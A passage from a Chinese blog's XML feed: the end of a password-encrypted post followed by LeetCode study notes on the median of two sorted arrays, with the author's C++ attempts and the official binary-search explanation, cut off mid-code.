6ba872d2645b2b4e6fcaac6409f8d8dd3881a476b8cdc07cd09aef9483e20e6dcc42c24b94573c0ea8eaaf6d1405008ce82532af6645e89316b27ae77cf81a681f0a23efb6753ad557a254616bbc2741a61c300e29595e37d7ada826926abe084481451ec38701a6d02705242105978a8fc8170319dcbec144fc483d21f39d32bd9864878dbcaeae3f8d7ba0b9732878f8b291120504ef41255adec6494be0aa52edb16c432f7b811f10e76cbed7274d0ac0c4235153616956f5b598d2845e5eda9b630e16e8bab56f30da1a5a9f0919c5469c84f51a7ff232f755957f18505caafc73683e2b313436f9bc39c8e34ed47d85bb19f4f7cb93bfd5634375603a228bb974d6eaa8d4ea81e124d64d82efdcb8841d4cc11267ff41dad222a588837ae9e9d895d782cce7085a1dad903c1878fe58a223ee6b817b753d901c01be6b44f23b826039f5cc931f2daadf8d04d806ecc40b779d41c22cbe127f41b8ae9b8302c8b631decf4360ed3e0fc5381398b2e5a63606ba17a4488d194eb1cc10008f93b82cabd49abee5162221c86f04a47e48e75438f7d411c70b79d71ebb2f8f9428144bcf2af554040a324aed728cb4a33cb83f3ec8e1453f841a63941375041588ab39286fb6494558f9ea3173800a1ff158686ce2a6f45efca6e3b541a24fa89eb371a8acf4a7e09fff47df7527a398e92be9e2337cc27c7a3ab69f1f8bdd9c6198d4591ca1fe548e0ba86d486a1ff79c61f1c45605225d412c15199c6b6070350837af0ef9da28350a429ebbcb0525808281e96cb27e1e0fb2f638141071f59147db8055633a54df78efad4b294688ecef2c0dec4c6f7b548426d5a321fde3ce1c382f365faa961ce9e97c236c92fae17cf51c0e0ebc7a827bacb3b078fa23111be8f83e33bbf453f3a81759d924d8388ff6e60fa22126024b1f91ff6f47c8906d8bef3d3f32a9abffed0b4c95e54f8a745c1509673874bb3139c1418159c5453b704faacdce8ef39e73e7cf5eaf1cbd5b6b4ce13cf0207c221bc548110421c5e79e5e5f694bb6eccf10723d69fbdca4b951b84d575f3be3927a5b1a21b6e757c842b39579670e13caef41dd5e7e6792bf03e63cf585616f56300c5c10caedf506394e0543d246751e1fa787b8b4f9a018f482dba1d31d9c2fccdd80e1ac5a327b4a6e34cbd2fa709d196329e5fa6200855317a04c0ad087dad0dd45faabf784bb472cbacb5fa0b434c82b38b79ecfab18583b984403d0fdf74d36788d51f0073e74180a43731da59aaeaa8f86fb38ed704ec3447a2b9f988de32a3078a0d97ed68115f135cccadd5410249411d8140ea74734702d28b09feb5989615d07132c8f1e4d549e0cc6bfb00ffdffded86658d1fccc9531c0d2470b48c88af8a22e113df8a05897e10b354053dc128530cbb5b65d5dce256bd49ef0a3153f1e6afead4fd43ba0872b26bf84bff244f75a84f48c1829688dc456b6116940095074948312647441f2a6ee7bea393d6f67a8d689cf7e982ce4f3bf4dd9bf739865cd07df17cf6169f7b7594fe85cb4e41922c918c03a95a3efdf23c488f29ae28e04b1bf89cdde5fbbc3701f84cd55814eac9b79f6c5f057d0cf1f6db70af140bba9c3ff19348b93c1f42e6827ccb1a6f95e59eeb5581a45eaf28f908b90c3b3456d89e46d71b5832a4e5f8aff96004f0051f41ef781956ee76cca619500dba76ec10ee005a607e84a0382c6a3c8692b6903fbadf27995198ac1087de90bec7e53dfafaa6fa773a31bb2c524ae253f0f53f6f7b21a3d502eba35039739b0a2592e2a5e82d66654546fb9bafedcb71585bd1d6a11a55e2cfab6aff81e8846ce5690aa96ca7057abc8f84b3cc62964935b6f803237cf861642c72a0f47f3c6485997124a27877a9934a9d284d985e4a625d63d326bd38ecfdd39890da5b0bdb655f1cfee00c071e7780ae32b1059631d70d358a9734543cf012c91408ed03ad81b77b79deabe2b271afb5a3e9c1ee039e183c14ded2c262fd22db92ce59ecbf7bcfc8f09648a1ff1e7df5d739809aab60db781c5b10dde42323370b90db182ede571c89fec6d9d42d89f617aeb42c4d3929453b36ae823fadc4d0867a78bbbcda65217b3089fb91abdd762b90ac808cab9f7cc5631ce91049b4671eaa88d43ba72b3996b26df0d7db3a70dd97a396efc767a06aa843ef139ca1d2edae4606484f0ac0137887dfacad2bc35646ea5a5aeae6dcbe48b4af9476529a9916a050a8f2ba02692586b4c7229f1b4e742a68f446fa90def7dc271c2406bf50277865005c9e4e254e6c7b114c41e1a391bc6dbca985efb9b8e863133d497ff12c2d0c5817e5c699c985cbbe5be68380920b12637f271c42500129608ac2c1f0bd04fce3a911afa01777f5f5ee296dabe326b005ae92dd8974f240f43a99af4a510a8c18beae6d454b24b995aaf4148580a48180749c7fef21372291a249507d70dfdb3b31d5883c8088f89c02450900eb34fbd6a1db4d4b620d7d62b2f838e2417c9a91040c5aff351b4b31e3d12cfffccb9edd110934bf1cf2d10dd26323db2f391b1e256bc141cd61b862d6388aa138bcdf1ebfeb9973b2891ac5b1c9b1bbdb2aa0e4e85dd7f217f39376ffcc81ef6e6b620d8189af7e816db4d4614442e7a1a33a67a64e2f4cc38058cd48d5a3a221873e2d665b429cdaeb21fb6ee59af91dce1396339910814b52bc83abe7312d418af6b42a6865c78290cd2d9a5d9df47fd74e20e95384671d39f0320d7620aefb0d302256e489a38c50293e258aa02f340e504af031779970e18337659e756bcb748c474291389823dce8e30ea5f5d0c8cb840c2cb10b64128b438920d0433823263d14a6a4eb808317df542c8fa76f001699d8deec7612fe870c03014362c39bf80ebec930f75211d824480f64a51cffe02e1a7c51fcbbe56c93c06c82f99cd7a4a6026fb0dc53eb83565935538c2f235046c8edcdec1cf2c5be94729c752d8240e972b97f7ebcaa8b2f41deeab3f652d205cea426d320b1d30f1f3e8d8c2842bffeb73162d3f876c082903ac6e7982e4bc33301af9621f4c58e463b151d271a9ecd5e080cb50d63f1e4812a4f19c0f705415e769ac029342888f3ce3b52ace4aa24648141044bfdd1b062f69d65d2f45fd17ec7e57c0d956aa99525ef18213a3ab47ce34eefcabb405d4d56f6ab76c79af653ad2258b0b405d880ca7d413f3fa176b0eeb75c9e94c8e0a8f1004f19a8a5aaf36ba5a8edd47700fe04ed564bd0760a43b7fe41e630e0ce85170143896e534a04ca8f3b585b85bf23988f9b24eb972175403677d7ffe7d79285bceb821b83233752f8339f5d4b38644eb5f01c6114804e2b32ca098ecaf504cc0a8bf503ec28348abf75edf4e2de8dd2e59e11be386b54760cc7328d5d69fa621c18b4e5e2fa5fcf5c0f02cc8aa5086895ba0ce5241c052eed4ccfebef9dcf5b73f465219d4bb2d420292d8dbca96d53cdd9d3d15e91b983c60bd2c52a0a8337db2b6b6f7d9d5c898914345e1dbc210f0010451387efa58c5e7f2ce7772993636b22702624a70d533b4575aac3a71e924f3b10d680107db19eb9c0aca89454eaf0ffce64022f0fd2188c97019da2f60f251188c528289826c07de4468db35adafee5d508cc89824572090e267d305f9b4a9ed0588a05e292a45cb75bdf73c79cc90fa3b44a62e54300c7f201fd868d6ebb3c96f5b3659824fb16351bc046230192b598e5cba8d8416fc89dc2bd0b7adccb997163d0f0e4c7396cb2846dee6763f545700acb9005023c3c6987570fc7cb709bd8f53c81a15998eeb8b08127e6c6bb3df7ed1b9a9b38d86b14d657fc0af3ca470cfaa32750a4ceb9154cba870377fdbf7d9d3a31cb25c82e892280ec84b8d5ee5a1820337ca2425f6f8d8654483444ea92aab8e12ce2bce917e35ecc8e160cceb8a847a3ddd8675f81edd21200e0824ce5b9db745e7b342c2b2f394bd913e1807c2f07551735a6eeca183da199fca19750e9684221c4455072bb833817a64513268964f08f393106a123f97b4702e6f4e26eeb373ccc9a07b78a411987a5ed82387c814360c745ff5ffb8964d5a4dadcb0e42b4d43a51ca1352aea1460631b9b36de2d47182899e9742ded47a3dc6ebafff389643e3d9dfec9a4d44bced43a74d0ca9b3645843461c6f3f87974bedd1d1ebf7f176be3b166a6ca188ce432624e24a0d073a2f8c3635f04b747b0435f5ef92a049348d90f640aac11be2e58f607208dd60159ef0967150ca5e38eeef9507ba8b14b14e1ad2a1d70dd8f6ecfcd1aa004bcdf9b33999d1320961a8a3985ae35a28c98640fb521ab45f899a0fa3552930b0883b6f848f05326c305c39fa1a006e805e83d747f701d0830ef7a37eed2e2aaf58a3363b47c9ce14dd2d099c32bbf705a5a34c4aa66d09c93e4b4cb2c1cb0a80209264814c26174369a0a9bf289d63d40ea860fa078430d3c5b88d41874eacf9a5e8d0e27d78090b8cff774f6c67e800b9b0cfb496837e65705eecaf758f1d8df0ce8419bc2a7c87a9fdb186eda073053fb0224ba3ffa958587c31689b3db87afdf928eee60f20489326d864b6ce564e74ba26c48d55a21108d2a40ce71de7317218feafaf8dc142d01fe9440603c06ee1bde44b29a51ae9c22fddac2b8165ea652997198ddbaf38ae8d888fe7b14fde5cf244e04462b280a039ffe98472ead2f4e8a56279aea1726e573f4b71f44f80e54c4c710c66d1c21bba65d9a2b477613905a67486db631964a0541a8009930b6690a9be0b5b87086aeb08aacc68c6dd2ef606ad521e82515a32ef762d49d475ca1da5bf9505f96f10922307c21fc2d56a76bfe3ec443ce6604ad4c4bfcb251f27fa0eb4093a4ee118d97e73dbfc738796812290202f95e27b357a8baa24ed9ff9d09ed98c30f8d00acebe709c75ae75d62bf8145bce33caf86b9c8b090aca3b2a47a39e604bb1986ecee9217436ffaba58e065dabf7ec0460411c5683f6a1b2987e69f3c361738a1472150e60f10d805211b19d25a0bf835f55a690d276a5cf7f76ca2ac41723da85787dbdc2107052fb8c571c0af0dc75285aea8a3ab2a8a64ef34e86f28f72786287af96b60887e7d23c7a0309424e4707c05fe7bdaa2641122f1e278b670ba09f43d14c29715a4dfc04790cc4014c68d1915266b070984c50add50a1b503aab735d3a56b4038c190240ddfbc7c83204e333dd1301ed3e9ac0a820c3f0cd55f175b1417922a60106187068dddd627faa0e5a7e1b4e85a0a8ce65ecec87c679634c6d5ed17f66876b0634d25d3eec124a59ec6d97d7dda285363fd516fb1ef8d7cf7cd3cbc1119a1f22735bfe3383e31c95b1f243105b7651c34eb95fc58736e0fc8a2d39c150ae576213d0d02e26e2fc34317e55ac12948b6c1036201d4eaf8c8eb9c02fd7f944753cc4d703956318aaa83a8e0764f74b9c1668ca6dc3e849f95df0561f380038503fa5e7139562e81862850e16764e30c623ecabaf1d6f7e53b7f0a8e1cbe944687e50f860be27a74c97ce7cf83d6c8c63181c2352d17b1b0dffeab257eddf32656442151aad6939cadde0569fcfe9d41f260f2f4d2d7c7ccaf0223985821015b21c725d8716019921ef80900a82ecedecb949340bf63e1d967c96ce1d80017cfcc379931f6eba56f082df1b43bfe10951df336e672554611718390d6d2b3d340b803293eaccf75b25fd47fb1b1889022514e63b4194e5d99903640c38cb00e887f284c538753f3dd6e18255529125c2b19cdc3cc8738e918c3dc6f0e77f2093cc90470193b124ba7b050e020f6cc13f6af480d539115178f943f8e8b21ad9a2d4f612af27681a1161c431fb7c898745f8f7cc901a8f14e793dd33451987b4c59bc64a5b1c849a3525d00e87cf1456d19ea841c4a3beeefff1cc07719e9b792a213c197ba1b880c05d7b42e6d80145d3ca5cb340865cf2fdf26266b34787d139771ba18d8e08f187e56f055a0fdbe4c642ad45511c8e001065fe49779b5fae038e55d5fd415eef52a5da7936576c38ba793bd82ef36ade4f8bb0303a34dc7294e17aaeb0dc725048f3d73062084fd98543e38967bfd52e513d2b4067c07a8f56cfdc32409ea9312500e07d575080283f545a68feceb44bd8c607682039f2c3c8b96e551d52fe048b7489f96eccf87d31db188463bfb65a494f2cc398511c1ac60bb6ad62d274da9bc17463311cf767535592efd780d163618daa1092631053a0dcf7749de2d44cd0979cd5358ac3482e79204f6f88e877eca3f2664e91308b23f628a9647b67efc401121280913c1e538ed1281b048a9f14fd46e6809d2ff0add0f302a87062164d53a53acfb9ae67302296c708c861124532420057c79b0e5e6d5a75c7872b73635aab69448ecc0fc8ea13bd3e60b05693da168f5790b92ac9b3bdeeea6269717988066ff56c71983afe3ca7308eb0392fc6af9c4265f8be4151a5318e7640a060ed48a9a0445682131c10d407109ac6bcfc17e50b139d5afbdb985f98e64a9bcf7f00d2dc3783a1fd07735048ff0847e6e543974453be782a53eadc61c2754d5f9646943f5f6a979933828eb1ec5dd3e9a765fe7f768a841530d988e1bf3aeadc8051470f9ead5e3002ca11a5684f18c2d0744d1b368c490e022304407deae615b5ede719567f20043f1b6885545e1b7142940fe215bd442575567a524311b1fbe60c272bbc2c671dc10f7aed63e1735e6f1546f25745835db7a7302812824ec128578b7d487b04d6913442866322fa66f0db4d076026b611d01c62e5350735e8bc143d3f46a5e312e01ed52ccbe84fd7bbfab84acfd8075abbb2767990fbd34e38d0ea8a80779c07a52681c958e3fd79db939114bf7f8c00aed087aee602f49d8bc82f73dac0a1d935fd5b139bff87eea3e81f4b8c35d217c95c89f8ba97bf9896c68790550105d2ef76ce3eee7957f42956b6601f4e99b40c2eb4c602a4c2f0a4cef5297b67fa0dd3a6234b9a7130d74aec40acad35757b68e2fa8673009747265742ec33ab98be43ea4dff000a2e8b2a0092e3cf9a5d9a2e15dc2d909121bd34383daffae81c2d6e5cec6c13ef2c30e8f13bdfd3eac4d681b4af1daff28be0833f0b03b1b390cce3bf0b71bdbfd047e0f7ce25b3121fb7720bd799b1a0e05cfecdd1674e7311b1589f9a158514c4ecf73fa75b724ab13f46354a238ef9c65062c37afebbeb9b9ad36b0d280b5f10371f5c4b8c8759c28d4f4a96e330874c6d9289b760c2d1505734b8522c238f086aa06da5ddbe819dd709025eb71f96c79871e61a1d4835a4eba40861c843fd3a43079ec02fdfd2f94e0ce0719498ec61eb18e76bdf52ad42c8dd9e03d8067352e77b8129ca740a0789657f2d462fc5d8f7906592e077f089349d0501dcabe2165f5fe2342c7c2bc82365df8cbecf152c769a3184edf09b96dece3427df1175d2df1d34f9d66443ad51c10584e113208936f0dbeedb4b6c924a45297eb7528d27aab51bbbadd26c1020927524041be7b124f296fc8c7651a933dd69d898ad8785b0ebe14f4b6d5cf23e6e39948390d3ed61453dde59884c395df8e005e9038e108207e20a0ae4be81b9cdcb067168f79e00fa9e694457d5bd7bae50c52fc5332945601a3f48bcd95629178daac7a334cb9db1ffa962df04961b34a10166cff6add135005d4eb34a78c299b811d118320c0ef71641dc3711be4e2ece30578392069b9d84389b3a0268da13ead637dca82e5b961dc2798bbd6a7efb0bdf3605e99eeb6a8e6754ef14578fe417c2673ec93d565cbd63243805fa5ebcd605436938faea434d3e6f8de035f2d7a18ee05658d11a25714be6d1ff9b9692e2f272e984376263f74aea106b51c830e341687c71ab5949bed062bb187b3548c7c7cd6561ab6bdd2eb8c489bd8e8137a4840451db052b68930f7c92808b7d36441cee03e9e45f527480d4752a520eca1954ec90b5020b5b5eae2b7ddac7489a26c97edc70dffdd08e566381333f8a2a3a5b1490d6885d9db258a8e6af37cab51ef194f6bcc941587c341eff0c494876a1a0e6ca12933a9bee5f5421e7bca25da50c410b8e011b6f07ccd055d86e2058da2607b1832027f1c535aae311</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">请输入密码。</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 3</title>
      <link href="/posts/5363f96a/"/>
      <url>/posts/5363f96a/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 3</h1><h2 id="4-寻找两个正序数组的中位数"><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h2><p>难度：困难</p><p>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。</p><p>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,2], nums2 = [3,4]</span><br><span class="line">输出：2.50000</span><br><span class="line">解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [0,0], nums2 = [0,0]</span><br><span class="line">输出：0.00000</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [], nums2 = [1]</span><br><span class="line">输出：1.00000</span><br></pre></td></tr></table></figure><p><strong>示例 5：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [2], nums2 = []</span><br><span class="line">输出：2.00000</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>nums1.length == m</code></li><li><code>nums2.length == n</code></li><li><code>0 &lt;= m &lt;= 1000</code></li><li><code>0 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= m + n &lt;= 2000</code></li><li><code>-106 &lt;= nums1[i], nums2[i] &lt;= 106</code></li></ul><h3 id="我的答案：">我的答案：</h3><blockquote><p>大致<strong>思路</strong>就是把两个数组合并到一个新数组里，然后对这个数组进行排序，最后直接求中位数即可，粗暴。虽然通过了力扣测试，但并没有达到时间复杂度的要求。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> b = nums2.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nums</span><span class="params">(a + b)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; a; i++) &#123;</span><br><span class="line">            nums[i] = nums1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; a + b; i++) &#123;</span><br><span class="line">            nums[i] = nums2[i - a];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a + b; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; a + b; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = nums[i];</span><br><span class="line">                    nums[i] = nums[j];</span><br><span class="line">                    nums[j] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((a + b) % <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">double</span>)nums[(a + b) / <span class="number">2</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">return</span></span> (<span class="keyword">double</span>)(nums[(a + b) / <span class="number">2</span>] + nums[(a + b) / <span class="number">2</span> - <span class="number">1</span>]) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>236 ms</strong></p></li><li><p>内存消耗: <strong>87.3 MB</strong></p></li></ul><h3 id="官方答案-5">官方答案</h3><h4 id="二分查找">二分查找</h4><p>在题解中，又给我们引入了新的方法：<strong>二分查找</strong>。</p><blockquote><p>根据中位数的定义，当 m+n 是奇数时，中位数是两个有序数组中的第 (m+n)/22 个元素，当 m+n 是偶数时，中位数是两个有序数组中的第 (m+n)/2 个元素和第 (m+n)/2+1 个元素的平均值。因此，这道题可以转化成寻找两个有序数组中的第 k 小的数，其中 k 为 (m+n)/2 或 (m+n)/2+1。</p><p>假设两个有序数组分别是 A 和 B。要找到第 k 个元素，我们可以比较 A[k/2−1] 和 B[k/2−1]，其中 / 表示整数除法。由于 A[k/2−1] 和 B[k/2−1] 的前面分别有 A[0 ~ k/2−2] 和 B[0 ~ k/2−2]，即 k/2−1 个元素，对于 A[k/2−1] 和 B[k/2−1] 中的较小值，最多只会有 (k/2−1)+(k/2−1)≤k−2 个元素比它小，那么它就不能是第 k 小的数了。</p><p>因此我们可以归纳出三种情况：</p><ul><li><p>如果 A[k/2−1]&lt;B[k/2−1]，则比 A[k/2−1] 小的数最多只有 A 的前 k/2−1 个数和 B 的前 k/2−1 个数，即比 A[k/2−1] 小的数最多只有 k−2 个，因此 A[k/2−1] 不可能是第 k 个数，A[0] 到 A[k/2−1] 也都不可能是第 k 个数，可以全部排除。</p></li><li><p>如果 A[k/2−1]&gt;B[k/2−1]，则可以排除 B[0] 到 B[k/2−1]。</p></li><li><p>如果 A[k/2−1]=B[k/2−1]，则可以归入第一种情况处理。</p></li></ul><p><img src="4_fig1.png" alt="图解"></p><p>可以看到，比较 A[k/2−1] 和 B[k/2−1] 之后，可以排除 k/2 个不可能是第 k 小的数，查找范围缩小了一半。同时，我们将在排除后的新数组上继续进行二分查找，并且根据我们排除数的个数，减少 k 的值，这是因为我们排除的数都不大于第 k 小的数。</p><p>有以下三种情况需要特殊处理：</p><ul><li><p>如果 A[k/2−1] 或者 B[k/2−1] 越界，那么我们可以选取对应数组中的最后一个元素。在这种情况下，我们必须根据排除数的个数减少 k 的值，而不能直接将 k 减去 k/2。</p></li><li><p>如果一个数组为空，说明该数组中的所有元素都被排除，我们可以直接返回另一个数组中第 k 小的元素。</p></li><li><p>如果 k=1，我们只要返回两个数组首元素的最小值即可。</p></li></ul><p>用一个例子说明上述算法。假设两个有序数组如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: 1 3 4 9</span><br><span class="line">B: 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>两个有序数组的长度分别是 4 和 9，长度之和是 13，中位数是两个有序数组中的第 7 个元素，因此需要找到第 k=7 个元素。</p><p>比较两个有序数组中下标为 k/2−1=2 的数，即 A[2] 和 B[2]，如下面所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: 1 3 4 9</span><br><span class="line">       ↑</span><br><span class="line">B: 1 2 3 4 5 6 7 8 9</span><br><span class="line">       ↑</span><br></pre></td></tr></table></figure><p>由于 A[2]&gt;B[2]，因此排除 B[0] 到 B[2]，即数组 B 的下标偏移（offset）变为 3，同时更新 k 的值：k=k−k/2=4。</p><p>下一步寻找，比较两个有序数组中下标为 k/2−1=1 的数，即 A[1] 和 B[4]，如下面所示，其中方括号部分表示已经被排除的数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: 1 3 4 9</span><br><span class="line">     ↑</span><br><span class="line">B: [1 2 3] 4 5 6 7 8 9</span><br><span class="line">             ↑</span><br></pre></td></tr></table></figure><p>由于 A[1]&lt;B[4]，因此排除 A[0] 到 A[1]，即数组 A 的下标偏移变为 2，同时更新 k 的值：k=k−k/2=2。</p><p>下一步寻找，比较两个有序数组中下标为 k/2−1=0 的数，即比较 A[2] 和 B[3]，如下面所示，其中方括号部分表示已经被排除的数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: [1 3] 4 9</span><br><span class="line">         ↑</span><br><span class="line">B: [1 2 3] 4 5 6 7 8 9</span><br><span class="line">           ↑</span><br></pre></td></tr></table></figure><p>由于 A[2]=B[3]，根据之前的规则，排除 A 中的元素，因此排除 A[2]，即数组 A 的下标偏移变为 3，同时更新 k 的值： k=k−k/2=1。</p><p>由于 k 的值变成 1，因此比较两个有序数组中的未排除下标范围内的第一个数，其中较小的数即为第 k 个数，由于 A[3]&gt;B[3]，因此第 k 个数是 B[3]=4。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A: [1 3 4] 9</span><br><span class="line">           ↑</span><br><span class="line">B: [1 2 3] 4 5 6 7 8 9</span><br><span class="line">           ↑</span><br></pre></td></tr></table></figure><p>作者：LeetCode-Solution</p></blockquote><p>研读了题解之后，我又重新更改了一遍代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getNum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> b = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(index1 == a) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(index2 == b) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">min</span>(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> newind1 = <span class="built_in">min</span>(index1 + k / <span class="number">2</span> - <span class="number">1</span>, a - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> newind2 = <span class="built_in">min</span>(index2 + k / <span class="number">2</span> - <span class="number">1</span>, b - <span 